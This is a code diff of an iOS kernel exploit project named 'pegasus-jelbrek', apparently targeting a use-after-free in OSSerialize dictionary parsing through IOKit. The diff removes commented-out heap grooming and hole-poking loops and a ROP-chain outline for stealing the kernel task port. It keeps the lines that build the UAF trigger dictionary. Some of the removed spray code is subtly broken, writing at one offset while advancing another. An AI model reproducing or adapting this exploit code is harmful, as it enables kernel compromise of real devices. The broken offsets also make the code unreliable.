@@ -2,8 +2,6 @@
 //  main.m
 //  pegasus-jelbrek
 //
-//  Created by Rohit on 10/4/16.
-//  Copyright © 2016 Rohit. All rights reserved.
 //
 
 #import <UIKit/UIKit.h>
@@ -498,268 +496,6 @@ void use_after_free(void)
     //io_connect_t  cnn[500] ;
     io_iterator_t iter;
 
-
-    
-
-   //DICT for heap massage
-    //<dict><string>A</string></dict>
-  /*  memcpy(data, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
-    bufpos1 += sizeof(kOSSerializeBinarySignature);
-    
-    *(uint32_t *)(data+bufpos1) = kOSSerializeDictionary | 0x80000000 | 0x1; bufpos1 += 4; //0
-    
-    *(uint32_t *)(data+bufpos1) = kOSSerializeEndCollection|kOSSerializeString | 0x05; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data+bufpos1) = 0x42434241; bufpos1 += 4;
-*/
-    
-    //Dict with about 100 filler strings
-/*    uint32_t bufpos3=0;
-
-    memcpy(data2, kOSSerializeBinarySignature, sizeof(kOSSerializeBinarySignature));
-    bufpos3 += sizeof(kOSSerializeBinarySignature);
-   
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeDictionary | 0x80000000 | 0x10; bufpos1 += 4; //0
-    
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000044; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    *(uint32_t *)(data2+bufpos3) = kOSSerializeEndCollection| kOSSerializeString | 0x02; bufpos1 += 4;   //1 string "A"
-    *(uint32_t *)(data2+bufpos3) = 0x00000041; bufpos1 += 4;
-    
-*/
-    
-
     //DICT for UAF Trigger
     /* create header */
     
@@ -775,93 +511,9 @@ void use_after_free(void)
     *(uint32_t *)(data1+bufpos2) = kOSSerializeBoolean | 0x1; bufpos2 += 4;   //2 bool  "true"
     
     *(uint32_t *)(data1+bufpos2) = kOSSerializeSymbol | 0x2; bufpos2 += 4;   //3 symbol "B"
-    *(uint32_t *)(data1+bufpos2) = 0x00000042; bufpos2 += 4;
-    
-//    *(uint32_t *)(data1+bufpos2) = kOSSerializeData | 0x20; bufpos2 += 4;   //4  vtable
-//*(uint32_t *)(data1+bufpos2) = 0x00000AAA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x00000ABA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x000000CA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x000000DA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x000000EA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x000000FA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x000000AA; bufpos2 += 4;
-//    *(uint32_t *)(data1+bufpos2) = 0x000000BA; bufpos2 += 4;
-    
+    *(uint32_t *)(data1+bufpos2) = 0x00000042; bufpos2 += 4;  
     *(uint32_t *)(data1+bufpos2) = kOSSerializeEndCollection | kOSSerializeObject | 0x1; bufpos2 += 4;
 
-    
-
-
-
-
-    
-    //CHECK THE VALIDITY OF THE DICT
-  /*
-    kr = io_service_get_matching_services_bin(master, data, bufpos1, &res); //trigger the UAF vul
-    
-    if (kr == KERN_SUCCESS) {
-        NSLog(@"(+) Dictionary is valid! Spawning user client...\n");
-    } else{
-        NSLog(@"Uh OH! DICT is invalid! \n");
-    
-        exit(0);
-    } */
-    
-   // IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("AppleKeyStore"), &iter);
-    //service = IOIteratorNext(iter);
-   
-   // NSLog(@"Heap Grooming..\n");
-
-    //open connection totalling allocations of 200 strings or so
-/*    for (int i =0; i<20;i++)
-    {
-        kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data2, bufpos3, &err, &cnn[0]);
-        if (kr!=0)
-        {
-            NSLog(@"Error in UC Clinet is %x %x\n\n", err, cnn[0]);
-            NSLog(@"Cannot create service.\n");
-            return;
-        }
-    }
-    
-    
-    //RM: open 32 conections with one big dict and anohter small dict
-    for (int i =20; i<52;i=i+2)
-    {
-        kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data2, bufpos3, &err, &cnn[i]); //dict with 100 strings
-        kr = io_service_open_extended(service, mach_task_self(), 0, NDR_record, (char*)data, bufpos1, &err, &cnn[i+1]); //dict with 1 string
-
-        if (kr!=0)
-        {
-            NSLog(@"Error in UC Clinet is %x %x\n\n", err, cnn[i]);
-            NSLog(@"Cannot create service.\n");
-            return;
-        }
-        
-    }
-    
-    
-    
-    NSLog(@"Poking Holes..........................................\n"); //free dicts with 1 string
-
-    for (int i =20; i<52;  i=i+2)
-    {
-        kr = IOServiceClose(cnn[i+1]);
-        if (kr!=0)
-        {
-            NSLog(@"Cannot delete service.\n");
-            continue;
-        }
-       // else
-         //   NSLog(@"Poking Holes..\n"); //free dicts with 1 string
-        
-        
-    }
-
-    //HEAP MASSAGE END
-    
-  */
-    
     
     //UAF trigger CODE BELOW
   
@@ -993,9 +645,6 @@ void use_after_free1(uint64_t address, unsigned int bytes)
    
     
     host_get_io_master(mach_host_self(), &master); // get iokit master port
-
-    
-
     
  /*   kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &res);
     if (kr != KERN_SUCCESS)
@@ -1042,21 +691,7 @@ void use_after_free1(uint64_t address, unsigned int bytes)
     
     while (object != 0)
     {
- //   io_buf_ptr_t buf_prop=NULL;
-  //      mach_msg_type_number_t bufCnt = 0;
-        
-        //kr= io_registry_entry_get_properties(object,&buf_prop,&bufCnt);
-        // kr=io_registry_entry_get_name(object,buf_prop);
-      //  if (kr == KERN_SUCCESS) {
-      //      //NSLog(@"%s %x\n\n\n",buf_prop,bufCnt);
-       // }
-       // else{
-    //        NSLog(@"Couldnt get the name of the registry entry %x\n\n\n", kr);
-       // }
-        
-    //    if (IORegistryEntryGetProperty(object, "IOUserClientCreator", buffer, &size) == 0)
-    //    {
-           // NSLog(@"In Here1 %x\n\n",size);
+
         if (strstr(buffer, search_str) == NULL)
     {
                 
@@ -1203,34 +838,6 @@ NSLog(@"COULDNT WRITE BYTES!");
 fclose(fp);
 fp = NULL;
 usleep(800000);
-}
-
-
-
-void rop_make()
-{
-    
-   /* 
-    int pid=0;
-    mach_port_t task;
-    
-    task_for_pid (mach_task_self(), 0 , &task );
-    
-    *task_addr = ipc_port_copyout_send(ipc_port_make_send(kernel_task->itk_self), current_task()->itk_space);
-
-        save stack pointer gadget1 =
-        stack_pivot address =
-        Call current_task()   address =
-        Load [x0, 0x2a0] to x0 (->itk_space has an offset of 0x2a0).   gadget2 =
-        Store x0 somewhere, for later use.   gadget 3 =
-        Load kernel_task to x0 (kernel_task is at a fixed address, see nm kernel | grep kernel_task).  address  =
-        Load [x0, 0xe8] to x0 (->itk_self has an offset of 0xe8).  address =
-        Call ipc_port_make_send().   address =
-        Restore the x0 we saved before to x1, without corrupting x0.   gadget4 =
-        Call ipc_port_copyout_send()     address =
-        Store x0 at task_addr    gadget 5 =
-        restore stack pointer to kernel stak            gadget 6
-    */
 }
 
 
